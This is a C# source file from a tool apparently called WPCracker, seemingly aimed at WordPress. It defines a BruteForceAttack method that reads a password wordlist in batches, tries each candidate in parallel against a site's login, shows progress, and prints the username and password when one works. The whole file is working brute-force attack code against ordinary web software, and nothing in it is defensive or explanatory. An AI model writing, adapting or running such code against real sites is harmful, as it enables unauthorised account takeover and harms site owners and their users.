using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;


namespace WPCracker
{
    class Attacks
    {
        public static void BruteForceAttack(string uri, string username, string wordlistPath, int maxThreads, int batchCount)
        {
            //var maxThreads = 16;
            //var batchCount = 1000;

            var login = new Login(new Uri(uri));
            using var sr = new StreamReader(wordlistPath);

            Console.CursorVisible = false;

            var (top, left) = (Console.CursorTop, Console.CursorLeft);

            void Update(decimal percentage, long seconds)
            {
                var remaining = TimeSpan.FromSeconds(seconds);
                Console.SetCursorPosition(left, top);
                Console.WriteLine($"{percentage * 100} % ready");
                Console.SetCursorPosition(left, top + 1);
                Console.WriteLine($"{remaining.TotalMinutes} minutes remaining");
            }

            var watch = System.Diagnostics.Stopwatch.StartNew();
            while (!sr.EndOfStream)
            {
                var buffer = new List<string>();
                for (var i = 0; i < batchCount; i++)
                {
                    buffer.Add(sr.ReadLine());
                }

                var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
                var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
                var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
                Update(percentage, remainingSeconds);

                Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, password =>
                {
                    try
                    {
                        if (!login.LogInAttemptAsync(username, password).GetAwaiter().GetResult()) return;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Password found!");
                        Console.WriteLine($"Username: {username}\nPassword: {password}");
                        Console.ResetColor();
                        Environment.Exit(0);
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine(ex.Message);
                        Console.ResetColor();
                    }
                });
            }
        }
    }
}
